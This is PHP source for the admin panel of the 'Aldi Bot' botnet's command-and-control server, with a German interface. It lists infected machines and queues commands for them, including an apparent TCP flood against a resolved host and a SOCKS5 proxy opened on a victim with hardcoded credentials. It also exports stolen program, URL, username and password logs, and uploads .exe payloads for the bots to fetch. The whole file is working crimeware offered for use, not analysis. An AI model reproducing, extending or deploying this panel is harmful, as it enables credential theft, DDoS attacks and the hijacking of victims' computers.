<?php
include('inc/sess.php'); 

if(isset($_GET['logout'])){
  session_start();
  session_destroy();
  header('Location: login.php');
}

//Host To IP
if(isset($_GET['host'])){
  $host = $_GET['host'];
  
  if(empty($host)){
	echo '<p><strong class="hosttoip">Bitte URL eingeben..</strong></p>';
  }else{
    echo '<p><strong class="hosttoip">StartTCP*'.htmlspecialchars(gethostbyname($_GET['host'])).'*80*3*4*100</strong></p>'; 
  }

  exit();
}
?>

<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN"
        "http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">
<html xmlns="http://www.w3.org/1999/xhtml" lang="en" xml:lang="en">
<head>
<title>Aldi Bot :: Admin</title>
<link rel="shortcut icon" href="img/favicon.ico" />
<link rel="stylesheet" type="text/css" href="css/style.css"/>
<script language="javascript" type="text/javascript" src="js/jquery.js"></script>
<script language="javascript" type="text/javascript" src="js/jquery.flot.pie.pack.js"></script>
<meta http-equiv="Content-Type" content="text/html; charset=UTF-8" />
</head>
<body>
  <div id="wrapper">
    <img src="img/aldi.gif" />
	
	<div id="navigation">
		<ul>
		  <li><a href="index.php?id=stats">Statistics</a>|</li>
		  <li><a href="index.php?id=bots&p=0">Bots</a>|</li>
		  <li><a href="index.php?id=tasks">Tasks</a>|</li>
		  <li><a href="index.php?id=logs&p=0">Logs</a>|</li>
		  <li><a href="index.php?id=upload">Uploader</a>|</li>
		  <li><a href="index.php?logout" onClick="javascript:return(confirm('Wirklich abmelden?'))">Abmelden</a></li>
		  <!-- <li><a href="">Grabber</a>|</li> -->
		  <li style="float: right;"><?php echo date('d.m.y H:i'); ?></li>
		</ul>
	</div>
	
	<br />
	<div id="content">
		<?php
		  include('inc/config.php');
		  include('functions.php');
	
		  if(isset($_GET['id'])){
		   $id = htmlspecialchars($_GET['id']);
		   
			  if($id == 'stats'){
				echo '<div id="content" style="height: 680px;">';
				show_NStats();
				show_countrys();
				
				echo '<br /><br /><div id="flotExample" style="width:500px;height:300px;margin-left: 25%;"></div><br /></div>';
			  }else if($id == 'bots'){
				show_bots();
			  }else if($id == 'tasks'){
				show_tasks();
			  }else if($id == 'logs'){
				show_logs();
			  }else if($id == 'showlogs'){
				show_logsanddelete();			
			  }else if($id == 'upload'){
				show_uploader();
			  }else{
				echo '<meta http-equiv="refresh" content="0; URL=index.php?id=stats">';
			  }		  
		  }
		?>
	</div>
	</div id="footer"></div>
  </div>
</body>
</html>

<?php
if(isset($_GET['deletetasks'])){
	if(safe_xss($_GET['del']) == '1'){
	
	$result1 = '';
	$result2 = '';
	
	   $query = mysql_query("SELECT id FROM tasks WHERE bots = done");
		while($row = mysql_fetch_array($query)){
		  $id = safe_xss($row['id']);
		  $result1 = mysql_query("DELETE FROM tasks WHERE id = '".safe_sql($id)."'");
		  $result2 = mysql_query("DELETE FROM tasks_done WHERE id = '".safe_sql($id)."'");
		}
		

		if(!$result1 || !$result2){
			die('<script>alert("Fehler - Kein Task beendet?");</script>
			  <meta http-equiv="refresh" content="0; URL=index.php?id=tasks">');
		}else{
			echo '<script>alert("Erfolgreich entfernt");</script>
			  <meta http-equiv="refresh" content="0; URL=index.php?id=tasks">';
		}
	}
	

	if($_GET['del'] == '2'){

		$result1 = mysql_query("DELETE FROM tasks");
		$result2 = mysql_query("DELETE FROM tasks_done");

			echo '<script>alert("Erfolgreich entfernt");</script>
				  <meta http-equiv="refresh" content="0; URL=index.php?id=tasks">';
	}
}

if(isset($_POST['addcmd'])){
	$cmd = $_POST['cmd'];
	$countries = '';
	$count = $_POST['count'];
	$execute = $_POST['execute'];
	
	if(empty($cmd) || empty($count) || empty($execute)){
		echo '<script>alert("Fehler: Mindestens ein Feld war leer!");</script>';
		echo '<meta http-equiv="refresh" content="0; URL=index.php?id=tasks">';
		exit();
	}
	
	if(!is_numeric($count)){
		echo '<script>alert("Fehler: Anzahl muss eine Zahl sein!");</script>';
		echo '<meta http-equiv="refresh" content="0; URL=index.php?id=tasks">';
		exit();
	}
	
	mysql_query("INSERT INTO tasks (command, countries, bots, time) VALUES ('".safe_sql($cmd)."', '".safe_sql($countries)."', '".safe_sql($count)."', '".safe_sql($execute)."')");
	echo '<script>alert("Ok!");</script>
		  <meta http-equiv="refresh" content="0; URL=index.php?id=tasks">';
}

if(isset($_GET['cmd'])){

	$cmd = safe_xss($_GET['cmd']);

	mysql_query("DELETE FROM tasks WHERE command = '".safe_sql($cmd)."'");
	mysql_query("DELETE FROM tasks_done WHERE command = '".safe_sql($cmd)."'");
	
	echo '<meta http-equiv="refresh" content="0; URL=index.php?id=tasks">'; 

}	

//Socks
if(isset($_GET['socks'])){
  $hwid = safe_xss($_GET['hwid']);
  $status = safe_xss($_GET['status']);
  $ip = safe_xss($_GET['ip']);
  
  if($status != '1'){
    echo '<script>alert(\'Bot offline - Socks5 kann nicht erstellt werden.\')</script>';
	echo '<meta http-equiv="refresh" content="0; URL=index.php?id=bots&p=0">'; 
	exit();
  }
  
  if($_GET['socks'] == 'active'){
    mysql_query("UPDATE bots Set socksaktiv = '1' WHERE hwid = '$hwid'");

	$cmd = 'CreateSocks*'.$hwid.'*1337*aldi*aldiftw';
	$countries = '';
	$count = '1';
	$execute = date('Y-m-d H:i:s');
	
	mysql_query("INSERT INTO tasks (command, countries, bots, time) VALUES ('".safe_sql($cmd)."', '".safe_sql($countries)."', '".safe_sql($count)."', '".safe_sql($execute)."')");
	
	echo '<script>alert("Socks erfolgreich erstellt! \n\n Host: '.$ip.' \n Port: 1337 \n User: aldi \n Pass: aldiftw \n\n Viel Spass");</script>';
  }else if($_GET['socks'] == 'deactive'){
    mysql_query("UPDATE bots Set socksaktiv = '0' WHERE hwid = '".safe_sql($hwid)."'");
  }

  echo '<meta http-equiv="refresh" content="0; URL=index.php?id=bots&p=0">'; 
}

//Logs
if(isset($_POST['del']) && isset($_POST['dele'])){	
	for ($i=0; $i<count($_POST["dele"]); $i++) {
		$wegdamit = $_POST['dele'][$i];
		mysql_query("DELETE FROM logs WHERE id = '".safe_sql($wegdamit)."'");
	}
		
	echo '<script>alert(unescape("'.safe_xss($i).' Logs erfolgreich entfernt!"));</script>
		  <meta http-equiv="refresh" content="0; URL=index.php?id=logs&p=0">';
}

if(isset($_GET['delall'])){
	mysql_query("TRUNCATE logs");
	

	echo '<script>alert("OK!");</script>
		  <meta http-equiv="refresh" content="0; URL=index.php?id=logs&p=0">';
}

if(isset($_GET['downlogs'])){
	$deinText = "<img src=\"http://img7.imagebanana.com/img/str9prrv/aldi.gif\" /><h3>Aldi Bot Logs</h3><br />";
	
	$ergebnis = mysql_query("SELECT * FROM logs");
	while($row = mysql_fetch_array($ergebnis)){
	  $deinText .= "Programm: ".$row['programm']."<br />URL: ".$row['url']."<br />User: ".$row['user']."<br />Pass: ".$row['pass']."<hr />";
	}

	$datafile = random_string(15).'.html';

	$fp = fopen('downlogs/'.$datafile, 'w');
	fputs($fp, $deinText);
	fclose($fp); 
	
	echo '<script>alert("Gespeichert unter: downlogs/'.$datafile.'");</script>
		  <meta http-equiv="refresh" content="0; URL=index.php?id=showlogs">';
}

if(isset($_GET['delsavelog'])){
  $log_name = $_GET['delsavelog'];
  
  if(preg_match('*/*',$log_name)){
	echo '<script>alert("Fehler..!")</script>';
	exit();
  }
  
  unlink('downlogs/'.$log_name);
  
	echo '<script>alert("Log wurde entfernt!");</script>
		  <meta http-equiv="refresh" content="0; URL=index.php?id=showlogs">';
}

//File Uploader
if(isset($_POST['uploadfile'])){
if(preg_match('/.exe/',$_FILES['datei']['name'])){
	if(preg_match('/exe./',$_FILES['datei']['name'])){
		echo '<script>alert("Nicht erlaubt!")</script>';
		echo '<meta http-equiv="refresh" content="0; URL=index.php?id=upload">';
		exit();
	}
	
	if($_FILES['datei']['size'] <  1024000){
		if(!file_exists('uploads/'.$_FILES['datei']['name'])){
			move_uploaded_file($_FILES['datei']['tmp_name'], 'uploads/'.$_FILES['datei']['name']);
			echo '<script>alert("Erfolgreich hochgeladen!")</script>';
		}else{
			echo '<script>alert("Datei existiert bereits, bitte unbenennen!")</script>';
		}
	}else{
		echo '<script>alert("Upload limit: 300kb!")</script>';
	}
}else{
	echo '<script>alert("Nur .exe Dateien erlaubt!")</script>';
}

echo '<meta http-equiv="refresh" content="0; URL=index.php?id=upload">';
}

if(isset($_GET['delupp'])){
  $file = $_GET['delupp'];
  
  if(preg_match('*/*',$file)){
	echo '<script>alert("Fehler..!")</script>';
	exit();
  }
  
  unlink('uploads/'.$file);
  
	echo '<script>alert("Datei wurde entfernt!");</script>
		  <meta http-equiv="refresh" content="0; URL=index.php?id=upload">'; 
}

?>